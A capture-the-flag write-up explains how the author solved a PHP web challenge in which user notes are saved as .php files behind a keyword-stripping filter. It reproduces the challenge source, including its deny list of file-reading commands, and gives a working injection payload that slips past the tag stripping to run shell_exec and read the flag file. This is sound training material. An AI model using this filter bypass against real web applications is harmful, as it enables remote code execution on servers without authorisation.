# ProgrammersHateProgramming2

**Author:** AOx0 :: Alejandro



If we look at the code we can see this challenge is almost the same as [ProgrammersHateProgramming1](https://github.com/idekJT/CTF_Writeups/tree/main/PBJar_CTF%20-%202021/web/ProgrammersHateProgramming)

```php
session_start();

function str_replace_first($from, $to, $content)
{
    $from = '/'.preg_quote($from, '/').'/';

    return preg_replace($from, $to, $content, 1);
}
function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
//<?= system('ls -la /'); ?//>
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<?", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```



It has the same protection method but adds a bunch more of words it will remove.

```php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<?", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```



The good part is that none of those new words it looks for are used by the solution I made for  [ProgrammersHateProgramming1](https://github.com/idekJT/CTF_Writeups/tree/main/PBJar_CTF%20-%202021/web/ProgrammersHateProgramming):

```php
flag <?php <?php echo shell_exec("php /flag.php"); ?>  ?>
```



The only thing we have to add is an extra <? so it does not remove the one in `<?php`

```php
<? flag <?php <?php echo shell_exec("php /flag.php"); ?>  ?>
```



![](https://i.imgur.com/45v7nu9.png)

![](https://i.imgur.com/EZoNQAh.png)